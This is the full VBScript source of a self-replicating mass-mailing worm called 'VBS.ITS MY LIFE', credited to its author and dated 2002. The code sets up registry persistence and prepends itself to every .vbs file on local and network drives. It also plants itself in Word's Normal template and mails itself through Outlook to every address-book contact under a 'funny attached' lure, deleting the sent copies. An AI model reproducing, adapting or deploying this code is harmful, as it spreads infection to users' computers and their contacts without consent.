'VBS.ITS MY LIFE
'Written by AHSAN on 06/28/2002 in SAHIWAL,PAKISTAN
On Error Resume Next
Set sf=CreateObject(""Scripting.FileSystemObject"")
Set ws=CreateObject(""WScript.Shell"")
Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
Set win=sf.GetSpecialFolder(0)
Set sys=sf.GetSpecialFolder(1)

Set cpy=sf.GetFile(WScript.ScriptFullName)
cpy.Copy(win&""\ITS MY LIFE.vbs"")
r=(""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire"")
ws.RegWrite r,(win&""\ITS MY LIFE.vbs"")

If cpy <> (win&""\ITS MY LIFE.vbs"") Then
MsgBox cpy&"" is not a VBS file valid."",vbcritical,cpy
else

Disque()
Word()
Spread()
If Day(Now)=1 Then
MsgBox ""ITS MY LIFE YEH!""+VbCrLf+""ITS MY LIFE, isn't it ??"",vbinformation,""VBS.ITS MY LIFE coded by AHSAN  (c)2002""
End If

bureau=ws.SpecialFolders(""Desktop"")
Set link=ws.CreateShortCut(bureau&""\Site_Web.url"")
link.TargetPath=""http://www.funkyahsan.4t.com
link.Save

End If

Sub Disque
If not sf.FileExists (sys&""\ITS MY LIFEFile.txt"") Then
Set DF=sf.CreateTextFile(sys&""\ITS MY LIFEFile.txt"")
DF.WriteLine ""Infected file by VBS.ITS MY LIFE""
DF.WriteLine ""Fichiers infectés par VBS.ITS MY LIFE :""
DF.WriteBlankLines(1)
DF.Close
End If
Set dr=sf.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&""\"")
End If
Next
End Sub
Sub infection(dossier)
Set f=sf.GetFolder(dossier)
Set fc=f.Files
For Each F in fc
ext=sf.GetExtensionName(F.path)
ext=lcase(ext)
If (ext=""vbs"") Then
Set verif=sf.OpenTextFile(F.path, 1, False)
If verif.ReadLine <> ""'VBS.ITS MY LIFE"" Then
tout=verif.ReadAll()
verif.Close
Set inf=sf.OpenTextFile(F.path, 2, True)
inf.Write(virus)
inf.Write(tout)
inf.Close
Set DF=sf.OpenTextFile(sys&""\ITS MY LIFEFile.txt"", 8, True)
DF.WriteLine F.path
DF.Close
End If
End If
Next
End Sub
Sub liste(dossier)
Set f=sf.GetFolder(dossier)
Set sd=f.SubFolders
For Each F in sd
infection(F.path)
liste(F.path)
Next
End Sub

Sub Word()
On Error Resume Next
Set CODE=sf.CreateTextFile(sys&""\ITS MY LIFECode.txt"")
CODE.Write(virus)
CODE.Close
If ws.RegRead(""HKLM\Software\Microsoft\Delirious\InfectNormal"") <> ""OK"" Then
Set wrd=WScript.CreateObject(""Word.Application"")
wrd.Visible=False
Set NorT=wrd.NormalTemplate.VBProject.VBComponents
NorT.Import sys&""\ITS MY LIFECode.txt""
wrd.Run ""Normal.ThisDocument.AutoExec""
wrd.Quit
ws.RegWrite ""HKLM\Software\Microsoft\Delirious\InfectNormal"",""OK"" 
End If
End Sub

Sub Spread()
WHO=ws.RegRead(""HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"")
Set OA=CreateObject(""Outlook.Application"")
Set MA=OA.GetNameSpace(""MAPI"")
For Each C In MA.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set AD=C.AddressEntries(D)
Set EM=OA.CreateItem(0)
EM.To=AD.Address
EM.Subject=""ITS MY LIFE EMail from "" & WHO
body=""Hi "" & AD.Name & "",""
body = body & VbCrLf & ""Look at this funny attached.""
body = body & VbCrLf & """"
body = body & VbCrLf & ""	Best Regards "" & WHO
EM.Body=body
EM.Attachments.Add(win&""\ITS MY LIFE.vbs"")
EM.DeleteAfterSubmit=True
If EM.To <> """" Then
EM.Send
End If
Next
End If
Next
End Sub
